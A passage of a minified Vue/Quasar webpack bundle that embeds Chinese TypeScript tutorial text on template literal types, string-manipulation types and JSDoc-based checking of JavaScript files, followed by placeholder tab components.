\"footer_sendoff_id\"\n```\n\n多个替换字符串的位置上的多个联合类型会进行交叉相乘：\n\n```ts\ntype EmailLocaleIDs = 'welcome_email' | 'email_heading';\ntype FooterLocaleIDs = 'footer_title' | 'footer_sendoff';\n\ntype AllLocaleIDs = `${EmailLocaleIDs | FooterLocaleIDs}_id`;\ntype Lang = 'en' | 'ja' | 'pt';\n\ntype LocaleMessageIDs = `${Lang}_${AllLocaleIDs}`;\n//   type EmailLocaleIDs = \"welcome_email\" | \"email_heading\";\ntype FooterLocaleIDs = 'footer_title' | 'footer_sendoff';\n\ntype AllLocaleIDs = `${EmailLocaleIDs | FooterLocaleIDs}_id`;\ntype Lang = 'en' | 'ja' | 'pt';\n\ntype LocaleMessageIDs = `${Lang}_${AllLocaleIDs}`;\n//   \"en_welcome_email_id\" | \"en_email_heading_id\" | \"en_footer_title_id\" | \"en_footer_sendoff_id\" | \"ja_welcome_email_id\" | \"ja_email_heading_id\" | \"ja_footer_title_id\" | \"ja_footer_sendoff_id\" | \"pt_welcome_email_id\" | \"pt_email_heading_id\" | \"pt_footer_title_id\" | \"pt_footer_sendoff_id\"\n```\n\n我们还是建议开发者要提前生成数量巨大的字符串联合类型，但如果数量较少，那么上面介绍的方法会有所帮助。\n\n### 类型中的字符串联合类型\n\n模版字面量的强大之处在于它能够基于给定的字符串来创建新的字符串。\n\n例如，JavaScript 中有一个常见的模式是基于对象的现有属性来扩展它。\n下面我们定义一个函数类型`on`，它用于监听值的变化。\n\n```ts\ndeclare function makeWatchedObject(obj: any): any;\n\nconst person = makeWatchedObject({\n    firstName: 'Saoirse',\n    lastName: 'Ronan',\n    age: 26,\n});\n\nperson.on('firstNameChanged', (newValue) => {\n    console.log(`firstName was changed to ${newValue}!`);\n});\n```\n\n注意，`on`会监听`\"firstNameChanged\"`事件，而不是`\"firstName\"`。\n模版字面量提供了操作字符串类型的能力：\n\n```ts\ntype PropEventSource<Type> = {\n    on(\n        eventName: `${string & keyof Type}Changed`,\n        callback: (newValue: any) => void\n    ): void;\n};\n\n/// Create a \"watched object\" with an 'on' method\n/// so that you can watch for changes to properties.\ndeclare function makeWatchedObject<Type>(\n    obj: Type\n): Type & PropEventSource<Type>;\n```\n\n这样做之后，当传入了错误的属性名会产生一个错误：\n\n```ts\ntype PropEventSource<Type> = {\n    on(\n        eventName: `${string & keyof Type}Changed`,\n        callback: (newValue: any) => void\n    ): void;\n};\n\ndeclare function makeWatchedObject<T>(obj: T): T & PropEventSource<T>;\n\nconst person = makeWatchedObject({\n    firstName: 'Saoirse',\n    lastName: 'Ronan',\n    age: 26,\n});\n\nperson.on('firstNameChanged', () => {});\n\n// 以下存在拼写错误\nperson.on('firstName', () => {});\nperson.on('frstNameChanged', () => {});\n```\n\n### 模版字面量类型推断\n\n注意，上例中没有使用原属性值的类型，在回调函数中仍使用`any`类型。\n模版字面量类型能够从替换字符串的位置推断出类型。\n\n下面，我们将上例修改成泛型，它会从`eventName`字符串来推断出属性名。\n\n```ts\ntype PropEventSource<Type> = {\n    on<Key extends string & keyof Type>(\n        eventName: `${Key}Changed`,\n        callback: (newValue: Type[Key]) => void\n    ): void;\n};\n\ndeclare function makeWatchedObject<Type>(\n    obj: Type\n): Type & PropEventSource<Type>;\n\nconst person = makeWatchedObject({\n    firstName: 'Saoirse',\n    lastName: 'Ronan',\n    age: 26,\n});\n\nperson.on('firstNameChanged', (newName) => {\n    //                        string\n    console.log(`new name is ${newName.toUpperCase()}`);\n});\n\nperson.on('ageChanged', (newAge) => {\n    //                  number\n    if (newAge < 0) {\n        console.warn('warning! negative age');\n    }\n});\n```\n\n这里，我们将`on`改为泛型方法。\n\n当用户使用字符串`\"firstNameChanged'`来调用时，TypeScript 会尝试推断`K`的类型。\n为此，TypeScript 尝试将`Key`与`\"Changed\"`之前的部分进行匹配，并且推断出字符串`\"firstName\"`。\n当 TypeScript 推断出了类型后，`on`方法就能够获取`firstName`属性的类型，即`string`类型。\n相似的，当使用`\"ageChanged\"`调用时，TypeScript 能够知道`age`属性的类型是`number`。\n\n类型推断可以以多种方式组合，例如拆解字符串然后以其它方式重新构造字符串。\n\n## 操作固有字符串的类型\n\n为了方便字符串操作，TypeScript 提供了一系列操作字符串的类型。\n这些类型内置于编译器之中，以便提高性能。\n它们不存在于 TypeScript 提供的`.d.ts`文件中。\n\n### `Uppercase<StringType>`\n\n将字符串中的每个字符转换为大写字母。\n\n##### Example\n\n```ts\ntype Greeting = 'Hello, world';\ntype ShoutyGreeting = Uppercase<Greeting>;\n//   \"HELLO, WORLD\"\n\ntype ASCIICacheKey<Str extends string> = `ID-${Uppercase<Str>}`;\ntype MainID = ASCIICacheKey<'my_app'>;\n//   \"ID-MY_APP\"\n```\n\n### `Lowercase<StringType>`\n\n将字符串中的每个字符转换为小写字母。\n\n```ts\ntype Greeting = 'Hello, world';\ntype QuietGreeting = Lowercase<Greeting>;\n//   \"hello, world\"\n\ntype ASCIICacheKey<Str extends string> = `id-${Lowercase<Str>}`;\ntype MainID = ASCIICacheKey<'MY_APP'>;\n//   \"id-my_app\"\n```\n\n### `Capitalize<StringType>`\n\n将字符串中的首字母转换为大写字母。\n\n##### Example\n\n```ts\ntype LowercaseGreeting = 'hello, world';\ntype Greeting = Capitalize<LowercaseGreeting>;\n//   \"Hello, world\"\n```\n\n### `Uncapitalize<StringType>`\n\n将字符串中的首字母转换为小写字母。\n\n##### Example\n\n```ts twoslash\ntype UppercaseGreeting = 'HELLO WORLD';\ntype UncomfortableGreeting = Uncapitalize<UppercaseGreeting>;\n//   \"hELLO WORLD\"\n```\n\n<details>\n    <summary>固有字符串操作类型的技术细节</summary>\n    <p>在TypeScript 4.1中会直接使用JavaScript中的字符串操作函数来操作固有字符串，且不会考虑本地化字符。</p>\n    <code><pre>\nfunction applyStringMapping(symbol: Symbol, str: string) {\n    switch (intrinsicTypeKinds.get(symbol.escapedName as string)) {\n        case IntrinsicTypeKind.Uppercase: return str.toUpperCase();\n        case IntrinsicTypeKind.Lowercase: return str.toLowerCase();\n        case IntrinsicTypeKind.Capitalize: return str.charAt(0).toUpperCase() + str.slice(1);\n        case IntrinsicTypeKind.Uncapitalize: return str.charAt(0).toLowerCase() + str.slice(1);\n    }\n    return str;\n}</pre></code>\n</details>\n",nc='# JavaScript文件里的类型检查\n\nTypeScript 2.3以后的版本支持使用`--checkJs`对`.js`文件进行类型检查和错误提示。\n\n你可以通过添加`// @ts-nocheck`注释来忽略类型检查；相反，你可以通过去掉`--checkJs`设置并添加一个`// @ts-check`注释来选则检查某些`.js`文件。 你还可以使用`// @ts-ignore`来忽略本行的错误。 如果你使用了`tsconfig.json`，JS检查将遵照一些严格检查标记，如`noImplicitAny`，`strictNullChecks`等。 但因为JS检查是相对宽松的，在使用严格标记时可能会有些出乎意料的情况。\n\n对比`.js`文件和`.ts`文件在类型检查上的差异，有如下几点需要注意：\n\n### 用JSDoc类型表示类型信息\n\n`.js`文件里，类型可以和在`.ts`文件里一样被推断出来。 同样地，当类型不能被推断时，它们可以通过JSDoc来指定，就好比在`.ts`文件里那样。 如同TypeScript，`--noImplicitAny`会在编译器无法推断类型的位置报错。 （除了对象字面量的情况；后面会详细介绍）\n\nJSDoc注解修饰的声明会被设置为这个声明的类型。比如：\n\n```javascript\n/** @type {number} */\nvar x;\n\nx = 0;      // OK\nx = false;  // Error: boolean is not assignable to number\n```\n\n你可以在这里找到所有JSDoc支持的模式，[JSDoc文档](type-checking-javascript-files.md#supported-jsdoc)。\n\n### 属性的推断来自于类内的赋值语句\n\nES2015没提供声明类属性的方法。属性是动态赋值的，就像对象字面量一样。\n\n在`.js`文件里，编译器从类内部的属性赋值语句来推断属性类型。 属性的类型是在构造函数里赋的值的类型，除非它没在构造函数里定义或者在构造函数里是`undefined`或`null`。 若是这种情况，类型将会是所有赋的值的类型的联合类型。 在构造函数里定义的属性会被认为是一直存在的，然而那些在方法，存取器里定义的属性被当成可选的。\n\n```javascript\nclass C {\n    constructor() {\n        this.constructorOnly = 0\n        this.constructorUnknown = undefined\n    }\n    method() {\n        this.constructorOnly = false // error, constructorOnly is a number\n        this.constructorUnknown = "plunkbat" // ok, constructorUnknown is string | undefined\n        this.methodOnly = \'ok\'  // ok, but methodOnly could also be undefined\n    }\n    method2() {\n        this.methodOnly = true  // also, ok, methodOnly\'s type is string | boolean | undefined\n    }\n}\n```\n\n如果一个属性从没在类内设置过，它们会被当成未知的。\n\n如果类的属性只是读取用的，那么就在构造函数里用JSDoc声明它的类型。 如果它稍后会被初始化，你甚至都不需要在构造函数里给它赋值：\n\n```javascript\nclass C {\n    constructor() {\n        /** @type {number | undefined} */\n        this.prop = undefined;\n        /** @type {number | undefined} */\n        this.count;\n    }\n}\n\nlet c = new C();\nc.prop = 0;          // OK\nc.count = "string";  // Error: string is not assignable to number|undefined\n```\n\n### 构造函数等同于类\n\nES2015以前，Javascript使用构造函数代替类。 编译器支持这种模式并能够将构造函数识别为ES2015的类。 属性类型推断机制和上面介绍的一致。\n\n```javascript\nfunction C() {\n    this.constructorOnly = 0\n    this.constructorUnknown = undefined\n}\nC.prototype.method = function() {\n    this.constructorOnly = false // error\n    this.constructorUnknown = "plunkbat" // OK, the type is string | undefined\n}\n```\n\n### 支持CommonJS模块\n\n在`.js`文件里，TypeScript能识别出CommonJS模块。 对`exports`和`module.exports`的赋值被识别为导出声明。 相似地，`require`函数调用被识别为模块导入。例如：\n\n```javascript\n// same as `import module "fs"`\nconst fs = require("fs");\n\n// same as `export function readFile`\nmodule.exports.readFile = function(f) {\n  return fs.readFileSync(f);\n}\n```\n\n对JavaScript文件里模块语法的支持比在TypeScript里宽泛多了。 大部分的赋值和声明方式都是允许的。\n\n### 类，函数和对象字面量是命名空间\n\n`.js`文件里的类是命名空间。 它可以用于嵌套类，比如：\n\n```javascript\nclass C {\n}\nC.D = class {\n}\n```\n\nES2015之前的代码，它可以用来模拟静态方法：\n\n```javascript\nfunction Outer() {\n  this.y = 2\n}\nOuter.Inner = function() {\n  this.yy = 2\n}\n```\n\n它还可以用于创建简单的命名空间：\n\n```javascript\nvar ns = {}\nns.C = class {\n}\nns.func = function() {\n}\n```\n\n同时还支持其它的变化：\n\n```javascript\n// 立即调用的函数表达式\nvar ns = (function (n) {\n  return n || {};\n})();\nns.CONST = 1\n\n// defaulting to global\nvar assign = assign || function() {\n  // code goes here\n}\nassign.extra = 1\n```\n\n### 对象字面量是开放的\n\n`.ts`文件里，用对象字面量初始化一个变量的同时也给它声明了类型。 新的成员不能再被添加到对象字面量中。 这个规则在`.js`文件里被放宽了；对象字面量具有开放的类型，允许添加并访问原先没有定义的属性。例如：\n\n```javascript\nvar obj = { a: 1 };\nobj.b = 2;  // Allowed\n```\n\n对象字面量的表现就好比具有一个默认的索引签名`[x:string]: any`，它们可以被当成开放的映射而不是封闭的对象。\n\n与其它JS检查行为相似，这种行为可以通过指定JSDoc类型来改变，例如：\n\n```javascript\n/** @type {{a: number}} */\nvar obj = { a: 1 };\nobj.b = 2;  // Error, type {a: number} does not have property b\n```\n\n### null，undefined，和空数组的类型是any或any\\[\\]\n\n任何用`null`，`undefined`初始化的变量，参数或属性，它们的类型是`any`，就算是在严格`null`检查模式下。 任何用`[]`初始化的变量，参数或属性，它们的类型是`any[]`，就算是在严格`null`检查模式下。 唯一的例外是像上面那样有多个初始化器的属性。\n\n```javascript\nfunction Foo(i = null) {\n    if (!i) i = 1;\n    var j = undefined;\n    j = 2;\n    this.l = [];\n}\nvar foo = new Foo();\nfoo.l.push(foo.i);\nfoo.l.push("end");\n```\n\n### 函数参数是默认可选的\n\n由于在ES2015之前无法指定可选参数，因此`.js`文件里所有函数参数都被当做是可选的。 使用比预期少的参数调用函数是允许的。\n\n需要注意的一点是，使用过多的参数调用函数会得到一个错误。\n\n例如：\n\n```javascript\nfunction bar(a, b) {\n  console.log(a + " " + b);\n}\n\nbar(1);       // OK, second argument considered optional\nbar(1, 2);\nbar(1, 2, 3); // Error, too many arguments\n```\n\n使用JSDoc注解的函数会被从这条规则里移除。 使用JSDoc可选参数语法来表示可选性。比如：\n\n```javascript\n/**\n * @param {string} [somebody] - Somebody\'s name.\n */\nfunction sayHello(somebody) {\n    if (!somebody) {\n        somebody = \'John Doe\';\n    }\n    console.log(\'Hello \' + somebody);\n}\n\nsayHello();\n```\n\n### 由`arguments`推断出的var-args参数声明\n\n如果一个函数的函数体内有对`arguments`的引用，那么这个函数会隐式地被认为具有一个var-arg参数（比如:`(...arg: any[]) => any`\\)）。使用JSDoc的var-arg语法来指定`arguments`的类型。\n\n```javascript\n/** @param {...number} args */\nfunction sum(/* numbers */) {\n    var total = 0\n    for (var i = 0; i < arguments.length; i++) {\n      total += arguments[i]\n    }\n    return total\n}\n```\n\n### 未指定的类型参数默认为`any`\n\n由于JavaScript里没有一种自然的语法来指定泛型参数，因此未指定的参数类型默认为`any`。\n\n#### 在extends语句中：\n\n例如，`React.Component`被定义成具有两个类型参数，`Props`和`State`。 在一个`.js`文件里，没有一个合法的方式在extends语句里指定它们。默认地参数类型为`any`：\n\n```javascript\nimport { Component } from "react";\n\nclass MyComponent extends Component {\n    render() {\n        this.props.b; // Allowed, since this.props is of type any\n    }\n}\n```\n\n使用JSDoc的`@augments`来明确地指定类型。例如：\n\n```javascript\nimport { Component } from "react";\n\n/**\n * @augments {Component<{a: number}, State>}\n */\nclass MyComponent extends Component {\n    render() {\n        this.props.b; // Error: b does not exist on {a:number}\n    }\n}\n```\n\n#### 在JSDoc引用中：\n\nJSDoc里未指定的类型参数默认为`any`：\n\n```javascript\n/** @type{Array} */\nvar x = [];\n\nx.push(1);        // OK\nx.push("string"); // OK, x is of type Array<any>\n\n/** @type{Array.<number>} */\nvar y = [];\n\ny.push(1);        // OK\ny.push("string"); // Error, string is not assignable to number\n```\n\n#### 在函数调用中\n\n泛型函数的调用使用`arguments`来推断泛型参数。有时候，这个流程不能够推断出类型，大多是因为缺少推断的源；在这种情况下，类型参数类型默认为`any`。例如：\n\n```javascript\nvar p = new Promise((resolve, reject) => { reject() });\n\np; // Promise<any>;\n```\n\n## 支持的JSDoc <a id="supported-jsdoc"></a>\n\n下面的列表列出了当前所支持的JSDoc注解，你可以用它们在JavaScript文件里添加类型信息。\n\n注意，没有在下面列出的标记（例如`@async`）都是还不支持的。\n\n* `@type`\n* `@param` \\(or `@arg` or `@argument`\\)\n* `@returns` \\(or `@return`\\)\n* `@typedef`\n* `@callback`\n* `@template`\n* `@class` \\(or `@constructor`\\)\n* `@this`\n* `@extends` \\(or `@augments`\\)\n* `@enum`\n\n它们代表的意义与usejsdoc.org上面给出的通常是一致的或者是它的超集。 下面的代码描述了它们的区别并给出了一些示例。\n\n### `@type`\n\n可以使用`@type`标记并引用一个类型名称（原始类型，TypeScript里声明的类型，或在JSDoc里`@typedef`标记指定的） 可以使用任何TypeScript类型和大多数JSDoc类型。\n\n```javascript\n/**\n * @type {string}\n */\nvar s;\n\n/** @type {Window} */\nvar win;\n\n/** @type {PromiseLike<string>} */\nvar promisedString;\n\n// You can specify an HTML Element with DOM properties\n/** @type {HTMLElement} */\nvar myElement = document.querySelector(selector);\nelement.dataset.myData = \'\';\n```\n\n`@type`可以指定联合类型—例如，`string`和`boolean`类型的联合。\n\n```javascript\n/**\n * @type {(string | boolean)}\n */\nvar sb;\n```\n\n注意，括号是可选的。\n\n```javascript\n/**\n * @type {string | boolean}\n */\nvar sb;\n```\n\n有多种方式来指定数组类型：\n\n```javascript\n/** @type {number[]} */\nvar ns;\n/** @type {Array.<number>} */\nvar nds;\n/** @type {Array<number>} */\nvar nas;\n```\n\n还可以指定对象字面量类型。 例如，一个带有`a`（字符串）和`b`（数字）属性的对象，使用下面的语法：\n\n```javascript\n/** @type {{ a: string, b: number }} */\nvar var9;\n```\n\n可以使用字符串和数字索引签名来指定`map-like`和`array-like`的对象，使用标准的JSDoc语法或者TypeScript语法。\n\n```javascript\n/**\n * A map-like object that maps arbitrary `string` properties to `number`s.\n *\n * @type {Object.<string, number>}\n */\nvar stringToNumber;\n\n/** @type {Object.<number, object>} */\nvar arrayLike;\n```\n\n这两个类型与TypeScript里的`{ [x: string]: number }`和`{ [x: number]: any }`是等同的。编译器能识别出这两种语法。\n\n可以使用TypeScript或Closure语法指定函数类型。\n\n```javascript\n/** @type {function(string, boolean): number} Closure syntax */\nvar sbn;\n/** @type {(s: string, b: boolean) => number} Typescript syntax */\nvar sbn2;\n```\n\n或者直接使用未指定的`Function`类型：\n\n```javascript\n/** @type {Function} */\nvar fn7;\n/** @type {function} */\nvar fn6;\n```\n\nClosure的其它类型也可以使用：\n\n```javascript\n/**\n * @type {*} - can be \'any\' type\n */\nvar star;\n/**\n * @type {?} - unknown type (same as \'any\')\n */\nvar question;\n```\n\n#### 转换\n\nTypeScript借鉴了Closure里的转换语法。 在括号表达式前面使用`@type`标记，可以将一种类型转换成另一种类型\n\n```javascript\n/**\n * @type {number | string}\n */\nvar numberOrString = Math.random() < 0.5 ? "hello" : 100;\nvar typeAssertedNumber = /** @type {number} */ (numberOrString)\n```\n\n#### 导入类型\n\n可以使用导入类型从其它文件中导入声明。 这个语法是TypeScript特有的，与JSDoc标准不同：\n\n```javascript\n/**\n * @param p { import("./a").Pet }\n */\nfunction walk(p) {\n    console.log(`Walking ${p.name}...`);\n}\n```\n\n导入类型也可以使用在类型别名声明中：\n\n```javascript\n/**\n * @typedef { import("./a").Pet } Pet\n */\n\n/**\n * @type {Pet}\n */\nvar myPet;\nmyPet.name;\n```\n\n导入类型可以用在从模块中得到一个值的类型。\n\n```javascript\n/**\n * @type {typeof import("./a").x }\n */\nvar x = require("./a").x;\n```\n\n### `@param`和`@returns`\n\n`@param`语法和`@type`相同，但增加了一个参数名。 使用`[]`可以把参数声明为可选的：\n\n```javascript\n// Parameters may be declared in a variety of syntactic forms\n/**\n * @param {string}  p1 - A string param.\n * @param {string=} p2 - An optional param (Closure syntax)\n * @param {string} [p3] - Another optional param (JSDoc syntax).\n * @param {string} [p4="test"] - An optional param with a default value\n * @return {string} This is the result\n */\nfunction stringsStringStrings(p1, p2, p3, p4){\n  // TODO\n}\n```\n\n函数的返回值类型也是类似的：\n\n```javascript\n/**\n * @return {PromiseLike<string>}\n */\nfunction ps(){}\n\n/**\n * @returns {{ a: string, b: number }} - May use \'@returns\' as well as \'@return\'\n */\nfunction ab(){}\n```\n\n### `@typedef`, `@callback`, 和 `@param`\n\n`@typedef`可以用来声明复杂类型。 和`@param`类似的语法。\n\n```javascript\n/**\n * @typedef {Object} SpecialType - creates a new type named \'SpecialType\'\n * @property {string} prop1 - a string property of SpecialType\n * @property {number} prop2 - a number property of SpecialType\n * @property {number=} prop3 - an optional number property of SpecialType\n * @prop {number} [prop4] - an optional number property of SpecialType\n * @prop {number} [prop5=42] - an optional number property of SpecialType with default\n */\n/** @type {SpecialType} */\nvar specialTypeObject;\n```\n\n可以在第一行上使用`object`或`Object`。\n\n```javascript\n/**\n * @typedef {object} SpecialType1 - creates a new type named \'SpecialType1\'\n * @property {string} prop1 - a string property of SpecialType1\n * @property {number} prop2 - a number property of SpecialType1\n * @property {number=} prop3 - an optional number property of SpecialType1\n */\n/** @type {SpecialType1} */\nvar specialTypeObject1;\n```\n\n`@param`允许使用相似的语法。 注意，嵌套的属性名必须使用参数名做为前缀：\n\n```javascript\n/**\n * @param {Object} options - The shape is the same as SpecialType above\n * @param {string} options.prop1\n * @param {number} options.prop2\n * @param {number=} options.prop3\n * @param {number} [options.prop4]\n * @param {number} [options.prop5=42]\n */\nfunction special(options) {\n  return (options.prop4 || 1001) + options.prop5;\n}\n```\n\n`@callback`与`@typedef`相似，但它指定函数类型而不是对象类型：\n\n```javascript\n/**\n * @callback Predicate\n * @param {string} data\n * @param {number} [index]\n * @returns {boolean}\n */\n/** @type {Predicate} */\nconst ok = s => !(s.length % 2);\n```\n\n当然，所有这些类型都可以使用TypeScript的语法`@typedef`在一行上声明：\n\n```javascript\n/** @typedef {{ prop1: string, prop2: string, prop3?: number }} SpecialType */\n/** @typedef {(data: string, index?: number) => boolean} Predicate */\n```\n\n### `@template`\n\n使用`@template`声明泛型：\n\n```javascript\n/**\n * @template T\n * @param {T} x - A generic parameter that flows through to the return type\n * @return {T}\n */\nfunction id(x){ return x }\n```\n\n用逗号或多个标记来声明多个类型参数：\n\n```javascript\n/**\n * @template T,U,V\n * @template W,X\n */\n```\n\n还可以在参数名前指定类型约束。 只有列表的第一项类型参数会被约束：\n\n```javascript\n/**\n * @template {string} K - K must be a string or string literal\n * @template {{ serious(): string }} Seriousalizable - must have a serious method\n * @param {K} key\n * @param {Seriousalizable} object\n */\nfunction seriousalize(key, object) {\n  // ????\n}\n```\n\n### `@constructor`\n\n编译器通过`this`属性的赋值来推断构造函数，但你可以让检查更严格提示更友好，你可以添加一个`@constructor`标记：\n\n```javascript\n/**\n * @constructor\n * @param {number} data\n */\nfunction C(data) {\n  this.size = 0;\n  this.initialize(data); // Should error, initializer expects a string\n}\n/**\n * @param {string} s\n */\nC.prototype.initialize = function (s) {\n  this.size = s.length\n}\n\nvar c = new C(0);\nvar result = C(1); // C should only be called with new\n```\n\n通过`@constructor`，`this`将在构造函数`C`里被检查，因此你在`initialize`方法里得到一个提示，如果你传入一个数字你还将得到一个错误提示。如果你直接调用`C`而不是构造它，也会得到一个错误。\n\n不幸的是，这意味着那些既能构造也能直接调用的构造函数不能使用`@constructor`。\n\n### `@this`\n\n编译器通常可以通过上下文来推断出`this`的类型。但你可以使用`@this`来明确指定它的类型：\n\n```javascript\n/**\n * @this {HTMLElement}\n * @param {*} e\n */\nfunction callbackForLater(e) {\n    this.clientHeight = parseInt(e) // should be fine!\n}\n```\n\n### `@extends`\n\n当JavaScript类继承了一个基类，无处指定类型参数的类型。而`@extends`标记提供了这样一种方式：\n\n```javascript\n/**\n * @template T\n * @extends {Set<T>}\n */\nclass SortableSet extends Set {\n  // ...\n}\n```\n\n注意`@extends`只作用于类。当前，无法实现构造函数继承类的情况。\n\n### `@enum`\n\n`@enum`标记允许你创建一个对象字面量，它的成员都有确定的类型。不同于JavaScript里大多数的对象字面量，它不允许添加额外成员。\n\n```javascript\n/** @enum {number} */\nconst JSDocState = {\n  BeginningOfLine: 0,\n  SawAsterisk: 1,\n  SavingComments: 2,\n}\n```\n\n注意`@enum`与TypeScript的`@enum`大不相同，它更加简单。然而，不同于TypeScript的枚举，`@enum`可以是任何类型：\n\n```javascript\n/** @enum {function(number): number} */\nconst Math = {\n  add1: n => n + 1,\n  id: n => -n,\n  sub1: n => n - 1,\n}\n```\n\n### 更多示例\n\n```javascript\nvar someObj = {\n  /**\n   * @param {string} param1 - Docs on property assignments work\n   */\n  x: function(param1){}\n};\n\n/**\n * As do docs on variable assignments\n * @return {Window}\n */\nlet someFunc = function(){};\n\n/**\n * And class methods\n * @param {string} greeting The greeting to use\n */\nFoo.prototype.sayHi = (greeting) => console.log("Hi!");\n\n/**\n * And arrow functions expressions\n * @param {number} x - A multiplier\n */\nlet myArrow = x => x * x;\n\n/**\n * Which means it works for stateless function components in JSX too\n * @param {{a: string, b: number}} test - Some param\n */\nvar fc = (test) => <div>{test.a.charAt(0)}</div>;\n\n/**\n * A parameter can be a class constructor, using Closure syntax.\n *\n * @param {{new(...args: any[]): object}} C - The class to register\n */\nfunction registerClass(C) {}\n\n/**\n * @param {...string} p1 - A \'rest\' arg (array) of strings. (treated as \'any\')\n */\nfunction fn10(p1){}\n\n/**\n * @param {...string} p1 - A \'rest\' arg (array) of strings. (treated as \'any\')\n */\nfunction fn9(p1) {\n  return p1.join();\n}\n```\n\n### 已知不支持的模式\n\n在值空间中将对象视为类型是不可以的，除非对象创建了类型，如构造函数。\n\n```javascript\nfunction aNormalFunction() {\n\n}\n/**\n * @type {aNormalFunction}\n */\nvar wrong;\n/**\n * Use \'typeof\' instead:\n * @type {typeof aNormalFunction}\n */\nvar right;\n```\n\n对象字面量属性上的`=`后缀不能指定这个属性是可选的：\n\n```javascript\n/**\n * @type {{ a: string, b: number= }}\n */\nvar wrong;\n/**\n * Use postfix question on the property name instead:\n * @type {{ a: string, b?: number }}\n */\nvar right;\n```\n\n`Nullable`类型只在启用了`strictNullChecks`检查时才启作用：\n\n```javascript\n/**\n * @type {?number}\n * With strictNullChecks: true -- number | null\n * With strictNullChecks: off  -- number\n */\nvar nullable;\n```\n\n`Non-nullable`类型没有意义，以其原类型对待：\n\n```javascript\n/**\n * @type {!number}\n * Just has type number\n */\nvar normal;\n```\n\n不同于JSDoc类型系统，TypeScript只允许将类型标记为包不包含`null`。 没有明确的`Non-nullable` -- 如果启用了`strictNullChecks`，那么`number`是非`null`的。 如果没有启用，那么`number`是可以为`null`的。\n\n',rc={data:function(){return{MainComponent1:Zl,MainComponent2:nc}}},tc=rc,ec=Object(u["a"])(tc,Xl,Yl,!1,null,"0e0b00f5",null),ac=ec.exports,ic={mixins:[xn["a"]],components:{m1:bl,m2:Nl,m3:Kl,m4:ac},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"基础",value:"m1"},{label:"高级",value:"m2"},{label:"模板",value:"m3"},{label:"其他",value:"m4"}]}}},sc=ic,oc=Object(u["a"])(sc,rl,tl,!1,null,"565a8060",null),lc=oc.exports,cc={mixins:[xn["a"]],components:{basics:kn,css:jr,js:Bt,http:Ue,vue:ri,other:Xs,tool:nl,react:Wi,ts:lc},data:function(){return{tab:"basics",tabs:[{label:"basics",value:"basics"},{label:"css",value:"css"},{label:"js",value:"js"},{label:"http",value:"http"},{label:"vue",value:"vue"},{label:"react",value:"react"},{label:"ts",value:"ts"},{label:"other",value:"other"},{label:"tool",value:"tool"}]}}},pc=cc,uc=Object(u["a"])(pc,e,a,!1,null,"4629fc88",null);r["default"]=uc.exports},"7ebcb":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+(r+1),label:r+1+"."+n.text}})})),1),t("m"+n.tab,{tag:"component"})],1)},a=[],i=t("9523"),s=t.n(i),o=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n   rrrrrrrrrrrrrrrrrrrr\n")])},l=[],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"9c63039c",null),d=m.exports,g=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},b=[],v={},h=v,S=Object(u["a"])(h,g,b,!1,null,"08432fc3",null),y=S.exports,f=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},_=[],x={},w=x,E=Object(u["a"])(w,f,_,!1,null,"71db3503",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},C=[],j={},M=j,R=Object(u["a"])(M,k,C,!1,null,"47e71c44",null),L=R.exports,O=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},A=[],I={},D=I,P=Object(u["a"])(D,O,A,!1,null,"1df30385",null),N=P.exports,q=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},H=[],B={},F=B,U=Object(u["a"])(F,q,H,!1,null,"18022a74",null),J=U.exports,z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},W=[],$={},G=$,V=Object(u["a"])(G,z,W,!1,null,"6bea5bf2",null),Q=V.exports,K=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},X=[],Y={},Z=Y,nn=Object(u["a"])(Z,K,X,!1,null,"bfd28d70",null),rn=nn.exports,tn={components:{m1:d,m2:y,m3:T,m4:L,m5:N,m6:J,m7:Q,m8:rn},data:function(){return s()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"}])}},en=tn,an=Object(u["a"])(en,e,a,!1,null,"4d253e9c",null);r["default"]=an.exports},"84df":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+(r+1),label:r+1+"."+n.text}})})),1),t("m"+n.tab,{tag:"component"})],1)},a=[],i=t("9523"),s=t.n(i),o=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n   rrrrrrrrrrrrrrrrrrrr\n")])},l=[],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"68ac946d",null),d=m.exports,g=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},b=[],v={},h=v,S=Object(u["a"])(h,g,b,!1,null,"491e7330",null),y=S.exports,f=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},_=[],x={},w=x,E=Object(u["a"])(w,f,_,!1,null,"ae421804",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},C=[],j={},M=j,R=Object(u["a"])(M,k,C,!1,null,"7eeadb3f",null),L=R.exports,O=function(){var 